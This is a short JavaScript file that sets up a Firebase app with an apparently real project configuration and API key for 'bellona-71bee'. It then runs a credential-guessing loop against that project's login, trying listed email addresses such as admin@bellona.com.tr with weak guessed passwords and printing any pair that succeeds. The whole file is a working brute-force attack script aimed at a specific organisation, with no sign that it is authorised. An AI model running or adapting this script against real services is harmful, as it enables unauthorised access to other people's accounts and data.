import { initializeApp } from "firebase/app";
import { getAuth, signInWithEmailAndPassword } from "firebase/auth";

const firebaseConfig = {
  apiKey: "AIzaSyCP6ywEHkZKzUb-QqDDMaubuffGznMeUc0",
  authDomain: "bellona-71bee.firebaseapp.com",
  projectId: "bellona-71bee",
  storageBucket: "bellona-71bee.firebasestorage.app",
  messagingSenderId: "622122795654",
  appId: "1:622122795654:web:9a42d0026d5df595f68707"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

async function testLogin() {
  const emails = [
    "eren@intramail.corp",
    "test@bellona.com.tr",
    "test1@bellona.com.tr",
    "admin@bellona.com.tr"
  ];
  const passwords = ["Bellona123!", "123456", "admin123", "Eren123!", "bellona123"];

  for (const email of emails) {
    for (const password of passwords) {
      try {
        const userCred = await signInWithEmailAndPassword(auth, email, password);
        console.log(`SUCCESS: Email: ${email} | Password: ${password}`);
        process.exit(0);
      } catch (err) {
        // ignore and try next
      }
    }
  }
  console.log("Failed to log in with guessed credentials.");
  process.exit(1);
}

testLogin();
